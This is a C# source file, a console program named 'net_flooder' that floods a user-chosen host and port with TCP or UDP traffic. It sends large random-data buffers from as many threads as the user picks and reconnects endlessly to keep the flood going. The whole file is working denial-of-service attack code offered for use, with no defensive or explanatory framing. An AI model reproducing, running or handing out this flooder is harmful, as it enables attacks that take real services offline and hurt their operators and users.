﻿using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Threading;
namespace net_flooder {
	class core {
		class AttackInfo {
			internal IPEndPoint Target;
			internal ProtocolType Protocol;
		}
		private static int BUFFER_SIZE = 50000;
		private static int THREAD_COUNT = 1;
		static void Main( string[] args ) {
			Debug.Listeners.Add( new ConsoleTraceListener() );
			AttackInfo _info = new AttackInfo();
			try {
				var hosts = Dns.GetHostAddresses( _q( "Type host" ) );
				if ( hosts.Length == 0 ) {
					_e( "no ips" );
					return;
				}
				_info.Target = new IPEndPoint( hosts[ 0 ], 0 );
			}
			catch ( System.Exception ex ) {
				_e( ex.Message );
				return;
			}
			int port;
			while ( !int.TryParse( _q( "Insert port" ), out port ) );
			_info.Target.Port = port;
			while ( !int.TryParse( _q( "Insert THREAD_COUNT" ), out THREAD_COUNT ) );
			_info.Protocol = _q( "Insert Protocol(TCP|UDP)" ).Trim().ToUpperInvariant() == "TCP" ? ProtocolType.Tcp : ProtocolType.Udp;
			Console.WriteLine( "Attacking {0}", _info.Target.ToString() );
			try {
				for ( int i = 0; i < THREAD_COUNT; i++ )
					new Thread( new ParameterizedThreadStart( WAttack ) ).Start( _info );
			}
			catch ( Exception ex ) {
				_e( ex.Message );
				return;
			}
		}
		private static void WAttack( object trg ) {
			var v =  (AttackInfo)trg ;
			if(v.Protocol==ProtocolType.Tcp)
				TCPAttack(v);
			else 
				UDPAttack(v);
		}
		private static void TCPAttack( AttackInfo info) {
			while ( true ) {
				try {
					#region Constructors
					Socket s = CreateSocket( info );
					Random r = new Random();
					SocketAsyncEventArgs Snd, Conn;
					byte[] bytes = new byte[ BUFFER_SIZE ];
					EventHandler<SocketAsyncEventArgs> CONNECTED = null, SND = null;
					#endregion
					Conn = new SocketAsyncEventArgs() {
						DisconnectReuseSocket = true,
						RemoteEndPoint = info.Target,
						SocketFlags = SocketFlags.None,
						UserToken = s
					};
					Snd = new SocketAsyncEventArgs() {
						DisconnectReuseSocket = true,
						SocketFlags = SocketFlags.None,
						UserToken = s
					};
					SND = ( a, b ) => {
						try {
							bool running = true;
							_d( String.Format( "Sent {0}K data!", BUFFER_SIZE ) );
							while ( running ) {
								while ( b.SocketError == SocketError.Success && ( (Socket)a ).Connected ) {
									try {
										if ( ( (Socket)a ).SendAsync( Snd ) )
											return; //prevent stack overflow
										_d( String.Format( "Sent {0}K data!", BUFFER_SIZE ) );
									}
									catch {
									}
								}
								running = false;
								if ( !running ) {
									Snd.UserToken = Conn.UserToken = a = s = CreateSocket(info);
									try {
										if ( ( (Socket)a ).ConnectAsync( Conn ) )
											return;
									}
									catch {
									}
									running = true;
									_d( "Connected!" );
								}
							}
						}
						catch {
						}
					};
					CONNECTED = ( a, b ) => {
						try {
							_d( "Connected!" );
							while ( b.SocketError != SocketError.Success || !( (Socket)a ).Connected )
								try {
									if ( ( (Socket)a ).ConnectAsync( Conn ) ) {
										_d( "Connected!" );
										return;//prevent stack overflow
									}
								}
								catch {
								}
							try {
								if ( !( (Socket)a ).SendAsync( Snd ) )
									SND( a, Snd );
							}
							catch {
							}
						}
						catch {
						}
					};
					Snd.Completed += SND;
					Conn.Completed += CONNECTED;
					r.NextBytes( bytes );
					Snd.SetBuffer( bytes, 0, bytes.Length );
					s.Blocking = false;
					_d( "real_attack_starting" );
					if ( !s.ConnectAsync( Conn ) )
						CONNECTED( s, Conn );
					Thread.Sleep( Timeout.Infinite );
				}
				catch {
				}
			}
		}
		private static void UDPAttack( AttackInfo info ) {
			while ( true ) {
				try {
					#region Constructors
					Socket s = CreateSocket( info );
					Random r = new Random();
					SocketAsyncEventArgs Snd;
					byte[] bytes = new byte[ BUFFER_SIZE ];
					EventHandler<SocketAsyncEventArgs>  SND = null;
					#endregion
					Snd = new SocketAsyncEventArgs() {
						RemoteEndPoint = info.Target,
						DisconnectReuseSocket = true,
						SocketFlags = SocketFlags.None,
						UserToken = s
					};
					SND = ( a, b ) => {
						try {
							_d( String.Format( "Sent {0}K data!", BUFFER_SIZE ) );
							while ( true ) {
									try {
										if ( ( (Socket)a ).SendToAsync( Snd ) )
											break; //prevent stack overflow
										_d( String.Format( "Sent {0}K data!", BUFFER_SIZE ) );
									}
									catch {}
							}
						}
						catch {}
					};
					Snd.Completed += SND;
					r.NextBytes( bytes );
					Snd.SetBuffer( bytes, 0, bytes.Length );
					s.Blocking = false;
					_d( "real_attack_starting" );
					if ( !s.SendToAsync( Snd ) )
						SND( s, Snd );
					Thread.Sleep( Timeout.Infinite );
				}
				catch {}
			}
		}
		static Socket CreateSocket( AttackInfo info ) {
			return new Socket( AddressFamily.InterNetwork, info.Protocol == ProtocolType.Tcp ? SocketType.Stream : SocketType.Dgram, info.Protocol );
		}
		static void _e( string e ) {
			var con_c = Console.ForegroundColor;
			try {
				Console.ForegroundColor = ConsoleColor.Yellow;
			}
			catch {
			}
			Console.ForegroundColor = ConsoleColor.Red;
			Console.WriteLine( e );
			try {
				Console.ForegroundColor = con_c;
			}
			catch {
			}
			Console.ReadLine();
		}
		static string _q( string q ) {
			var con_c = Console.ForegroundColor;
			try {
				Console.ForegroundColor = ConsoleColor.Yellow;
			}
			catch {
			}
			string s = "";
			Console.Write( "{0}{1}>", q, Environment.NewLine );
			try {
				Console.ForegroundColor = con_c;
			}
			catch {
			}
			s = Console.ReadLine();
			return s;
		}
		static void _d( string d ) {
			//Debug.WriteLine( d );
		}
	}
}